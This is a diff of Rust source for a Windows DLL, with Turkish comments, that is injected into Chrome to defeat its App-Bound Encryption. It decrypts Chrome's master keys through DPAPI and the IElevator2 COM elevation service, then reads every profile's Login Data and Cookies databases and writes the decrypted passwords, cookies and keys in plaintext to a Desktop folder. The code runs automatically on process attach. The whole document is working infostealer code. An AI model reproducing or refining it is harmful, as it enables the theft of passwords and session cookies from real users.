@@ -1,6 +1,6 @@
 use std::fs;
 use std::io::Write;
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::ptr;
 use std::thread;
 use std::time::{SystemTime, UNIX_EPOCH};
@@ -14,15 +14,22 @@ use winapi::{
         wtypesbase::CLSCTX_LOCAL_SERVER,
     },
     um::{
-        combaseapi::{CoCreateInstance, CoInitializeEx},
+        combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket},
         objbase::COINIT_APARTMENTTHREADED,
-        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringLen},
+        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringByteLen},
         winnt::DLL_PROCESS_ATTACH,
+        dpapi::CryptUnprotectData,
+        wincrypt::DATA_BLOB,
     },
     ctypes::c_void,
 };
 
-// Chrome 144+ için CLSID (aynı kalıyor)
+use aes_gcm::{
+    aead::{Aead, KeyInit},
+    Aes256Gcm, Nonce,
+};
+
+// Chrome 144+ için CLSID
 const CLSID_ELEVATOR: GUID = GUID {
     Data1: 0x708860E0,
     Data2: 0xF641,
@@ -30,8 +37,6 @@ const CLSID_ELEVATOR: GUID = GUID {
     Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
 };
 
-// YENİ: Chrome 144+ için IElevator2 IID'si
-// Kaynak: xaitax/Chrome-App-Bound-Encryption-Decryption v0.18.0 [citation:2]
 const IID_IELEVATOR2: GUID = GUID {
     Data1: 0x1BF5208B,
     Data2: 0x295F,
@@ -39,7 +44,6 @@ const IID_IELEVATOR2: GUID = GUID {
     Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
 };
 
-// IElevator2 vtable (DecryptData offset 40, Chrome için)
 #[repr(C)]
 struct IElevatorVTbl {
     QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
@@ -69,137 +73,230 @@ fn log_message(msg: &str) -> Result<(), std::io::Error> {
     Ok(())
 }
 
-fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
-    let _ = log_message(&format!("IElevator2 ile çözme başlatılıyor, veri uzunluğu: {}", encrypted_blob.len()));
-
+fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
     unsafe {
-        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
-        if hr < 0 {
-            return Err(format!("CoInitializeEx başarısız: 0x{:08X}", hr as u32));
+        let mut input = DATA_BLOB {
+            cbData: data.len() as u32,
+            pbData: data.as_ptr() as *mut u8,
+        };
+        let mut output = DATA_BLOB {
+            cbData: 0,
+            pbData: ptr::null_mut(),
+        };
+
+        if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
+            let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
+            winapi::um::winbase::LocalFree(output.pbData as *mut c_void);
+            Ok(result)
+        } else {
+            Err(format!("CryptUnprotectData failed: {}", winapi::um::errhandlingapi::GetLastError()))
         }
-
-        let mut elevator_ptr: *mut c_void = ptr::null_mut();
-        let hr = CoCreateInstance(
-            &CLSID_ELEVATOR,
-            ptr::null_mut(),
-            CLSCTX_LOCAL_SERVER,
-            &IID_IELEVATOR2,  // YENİ IID
-            &mut elevator_ptr,
-        );
-        
-        if hr < 0 {
-            let error_code = hr as u32;
-            let _ = log_message(&format!("CoCreateInstance başarısız: 0x{:08X}", error_code));
-            
-            // Hata kodunu anlamlı mesaja çevir
-            let error_msg = match error_code {
-                0x80040154 => "CLSID not registered (0x80040154) - Elevation service bulunamadı",
-                0x80029C4A => "Type library error (0x80029C4A) - IID uyumsuzluğu",
-                _ => "Bilinmeyen hata"
-            };
-            return Err(format!("CoCreateInstance başarısız: 0x{:08X} - {}", error_code, error_msg));
-        }
-        
-        let _ = log_message("IElevator2 instance'ı oluşturuldu.");
-
-        let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
-        if bstr_encrypted.is_null() {
-            return Err("SysAllocStringByteLen başarısız".to_string());
-        }
-
-        let mut bstr_decrypted: BSTR = ptr::null_mut();
-        let mut last_error: u32 = 0;
-
-        let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
-        let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
-
-        SysFreeString(bstr_encrypted);
-
-        if hr < 0 {
-            return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
-        }
-
-        let char_count = SysStringLen(bstr_decrypted);
-        let byte_len = (char_count as usize) * 2;
-        let raw_bytes = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len);
-        let decrypted = raw_bytes.to_vec();
-
-        SysFreeString(bstr_decrypted);
-        ((*vtable).Release)(elevator_ptr);
-
-        let _ = log_message(&format!("IElevator2 çözme başarılı, çıktı uzunluğu: {} byte", decrypted.len()));
-        Ok(decrypted)
     }
 }
 
-fn do_work() -> Result<(), Box<dyn std::error::Error>> {
-    log_message("DLL yüklendi, işlem başlatılıyor...")?;
-
-    let local_state_path = r"C:\Users\Kemal\AppData\Local\Google\Chrome\User Data\Local State";
-    let content = fs::read_to_string(local_state_path)
-        .map_err(|e| format!("Dosya okunamadı: {}", e))?;
-    log_message("Local State dosyası okundu.")?;
-
-    let json: Value = serde_json::from_str(&content)
-        .map_err(|e| format!("JSON ayrıştırılamadı: {}", e))?;
-
-    let key_b64 = if let Some(val) = json.get("app_bound_encrypted_key") {
-        val.as_str()
-    } else if let Some(os_crypt) = json.get("os_crypt") {
-        os_crypt.get("app_bound_encrypted_key").and_then(|v| v.as_str())
-    } else {
-        None
-    };
-
-    let key_b64 = key_b64
-        .ok_or("Anahtar bulunamadı: 'app_bound_encrypted_key'")?;
-    log_message(&format!("Base64 anahtar bulundu, uzunluk: {}", key_b64.len()))?;
-
-    use base64::engine::Engine as _;
-    let decoded = base64::engine::general_purpose::STANDARD.decode(key_b64)
-        .map_err(|e| format!("Base64 çözümleme hatası: {}", e))?;
-    log_message(&format!("Base64 çözüldü, ham veri uzunluğu: {} byte", decoded.len()))?;
-
-    let dpapi_blob = if decoded.len() >= 4 && &decoded[0..4] == b"APPB" {
-        log_message("APPB header'ı tespit edildi, kaldırılıyor...")?;
-        &decoded[4..]
-    } else {
-        log_message("APPB header'ı bulunamadı, tüm veri kullanılıyor...")?;
-        &decoded
-    };
-
-    log_message(&format!("DPAPI blob uzunluğu: {} byte", dpapi_blob.len()))?;
-
-    match decrypt_with_elevator(dpapi_blob) {
-        Ok(master_key) => {
-            let hex_repr = master_key.iter().map(|b| format!("{:02x}", b)).collect::<String>();
-            log_message(&format!("MASTER KEY (hex): {}", hex_repr))?;
-            log_message(&format!("MASTER KEY uzunluğu: {} byte", master_key.len()))?;
-
-            let ascii_part: String = master_key.iter()
-                .filter(|&&b| b.is_ascii_graphic() || b == b' ')
-                .map(|&b| b as char)
-                .collect();
-            if !ascii_part.is_empty() && ascii_part.len() < master_key.len() {
-                log_message(&format!("MASTER KEY (ascii): {}", ascii_part))?;
-            }
+fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
+    unsafe {
+        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
+        let co_init = hr >= 0 || hr as u32 == 0x80010106;
+        if !co_init {
+            return Err(format!("CoInitializeEx başarısız: 0x{:08X}", hr as u32));
         }
-        Err(e) => {
-            log_message(&format!("IElevator2 çözme HATASI: {}", e))?;
-            log_message("Not: Bu DLL Chrome içinde çalıştırılmalıdır.")?;
+
+        let result = (|| {
+            let mut elevator_ptr: *mut c_void = ptr::null_mut();
+            let hr = CoCreateInstance(&CLSID_ELEVATOR, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &IID_IELEVATOR2, &mut elevator_ptr);
+
+            if hr < 0 {
+                return Err(format!("CoCreateInstance başarısız: 0x{:08X}", hr as u32));
+            }
+
+            let hr_blanket = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
+            if hr_blanket < 0 {
+                let _ = log_message(&format!("CoSetProxyBlanket başarısız: 0x{:08X}", hr_blanket as u32));
+            }
+
+            let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
+            if bstr_encrypted.is_null() {
+                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
+                ((*vtable).Release)(elevator_ptr);
+                return Err("SysAllocStringByteLen başarısız".to_string());
+            }
+
+            let mut bstr_decrypted: BSTR = ptr::null_mut();
+            let mut last_error: u32 = 0;
+            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
+            let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);
+
+            SysFreeString(bstr_encrypted);
+
+            if hr < 0 {
+                ((*vtable).Release)(elevator_ptr);
+                return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
+            }
+
+            let byte_len = SysStringByteLen(bstr_decrypted) as usize;
+            let decrypted = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len).to_vec();
+            SysFreeString(bstr_decrypted);
+            ((*vtable).Release)(elevator_ptr);
+
+            Ok(decrypted)
+        })();
+
+        if hr >= 0 {
+            winapi::um::combaseapi::CoUninitialize();
+        }
+        result
+    }
+}
+
+fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
+    if data.len() < 15 { return Err("Data too short".to_string()); }
+    let nonce = Nonce::from_slice(&data[3..15]);
+    let ciphertext = &data[15..];
+    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| e.to_string())?;
+    cipher.decrypt(nonce, ciphertext).map_err(|e| e.to_string())
+}
+
+fn do_work() -> Result<(), Box<dyn std::error::Error>> {
+    let _ = log_message("İşlem başlatıldı...");
+    let user_profile = std::env::var("USERPROFILE")?;
+    let chrome_data_path = Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data");
+    let desktop_db_path = Path::new(&user_profile).join("Desktop\\chrome_db");
+
+    if !desktop_db_path.exists() {
+        fs::create_dir_all(&desktop_db_path)?;
+    }
+
+    let local_state_path = chrome_data_path.join("Local State");
+    if !local_state_path.exists() {
+        return Err("Local State bulunamadı".into());
+    }
+
+    let content = fs::read_to_string(&local_state_path)?;
+    let json: Value = serde_json::from_str(&content)?;
+
+    let mut master_keys_file = fs::File::create(desktop_db_path.join("master_keys.txt"))?;
+
+    // v10 Key Extraction
+    let mut v10_key = Vec::new();
+    if let Some(os_crypt) = json.get("os_crypt") {
+        if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
+            use base64::engine::Engine as _;
+            if let Ok(encrypted_key) = base64::engine::general_purpose::STANDARD.decode(key_b64) {
+                if encrypted_key.starts_with(b"DPAPI") {
+                    if let Ok(k) = decrypt_dpapi(&encrypted_key[5..]) {
+                        v10_key = k;
+                        let _ = writeln!(master_keys_file, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
+                        let _ = log_message("v10 Master Key başarıyla çıkarıldı.");
+                    }
+                }
+            }
         }
     }
 
-    log_message("İşlem tamamlandı.")?;
+    // v20 Key Extraction (App-Bound)
+    let mut v20_key = Vec::new();
+    let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str())
+        .or_else(|| json.get("os_crypt").and_then(|oc| oc.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));
+
+    if let Some(b64) = key_b64 {
+        use base64::engine::Engine as _;
+        if let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) {
+            let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
+            match decrypt_with_elevator(blob) {
+                Ok(k) => {
+                    v20_key = k;
+                    let _ = writeln!(master_keys_file, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>());
+                    let _ = log_message("v20 Master Key başarıyla çıkarıldı.");
+                }
+                Err(e) => { let _ = log_message(&format!("v20 Key Hatası: {}", e)); }
+            }
+        }
+    }
+
+    let mut profiles = vec!["Default".to_string()];
+    if let Ok(entries) = fs::read_dir(&chrome_data_path) {
+        for entry in entries.flatten() {
+            let name = entry.file_name().to_string_lossy().to_string();
+            if name.starts_with("Profile ") {
+                profiles.push(name);
+            }
+        }
+    }
+    profiles.sort_by_key(|s| if s == "Default" { 0 } else { s[8..].parse::<u32>().unwrap_or(999) });
+    let _ = log_message(&format!("Bulunan profil sayısı: {}", profiles.len()));
+
+    for profile in profiles {
+        let profile_path = chrome_data_path.join(&profile);
+        let profile_output_path = desktop_db_path.join(&profile);
+        fs::create_dir_all(&profile_output_path)?;
+
+        let mut results_file = fs::File::create(profile_output_path.join("decrypted_data.txt"))?;
+        let _ = writeln!(results_file, "=== Profil: {} ===", profile);
+
+        // Passwords Extraction
+        let login_db = profile_path.join("Login Data");
+        if login_db.exists() {
+            let temp_db = profile_output_path.join("Login_Data.tmp");
+            if fs::copy(&login_db, &temp_db).is_ok() {
+                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
+                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)));
+                        if let Ok(rows) = rows {
+                            let _ = writeln!(results_file, "\n--- Şifreler ---");
+                            for row in rows.flatten() {
+                                let (url, user, blob) = row;
+                                if blob.len() > 15 {
+                                    let key = if blob.starts_with(b"v20") { &v20_key } else { &v10_key };
+                                    if !key.is_empty() {
+                                        let dec = aes_gcm_decrypt(key, &blob).unwrap_or_else(|_| b"[Çözme Başarısız]".to_vec());
+                                        let _ = writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&dec));
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                let _ = fs::remove_file(temp_db);
+            }
+        }
+
+        // Cookies Extraction
+        let cookie_db = profile_path.join("Network\\Cookies");
+        if cookie_db.exists() {
+            let temp_db = profile_output_path.join("Cookies.tmp");
+            if fs::copy(&cookie_db, &temp_db).is_ok() {
+                if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
+                    if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
+                        let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)));
+                        if let Ok(rows) = rows {
+                            let _ = writeln!(results_file, "\n--- Çerezler (Cookies) ---");
+                            for row in rows.flatten() {
+                                let (host, name, blob) = row;
+                                if blob.len() > 15 {
+                                    let is_v20 = blob.starts_with(b"v20");
+                                    let key = if is_v20 { &v20_key } else { &v10_key };
+                                    if !key.is_empty() {
+                                        if let Ok(dec) = aes_gcm_decrypt(key, &blob) {
+                                            let val = if is_v20 && dec.len() > 32 { &dec[32..] } else { &dec[..] };
+                                            let _ = writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(val));
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                let _ = fs::remove_file(temp_db);
+            }
+        }
+    }
+    let _ = log_message("İşlem başarıyla tamamlandı.");
     Ok(())
 }
 
 #[no_mangle]
-pub extern "system" fn DllMain(
-    _hinst: *mut std::ffi::c_void,
-    fdw_reason: u32,
-    _lpv_reserved: *mut std::ffi::c_void,
-) -> i32 {
+pub extern "system" fn DllMain(_hinst: *mut std::ffi::c_void, fdw_reason: u32, _lpv_reserved: *mut std::ffi::c_void) -> i32 {
     if fdw_reason == DLL_PROCESS_ATTACH {
         thread::spawn(|| {
             if let Err(e) = do_work() {
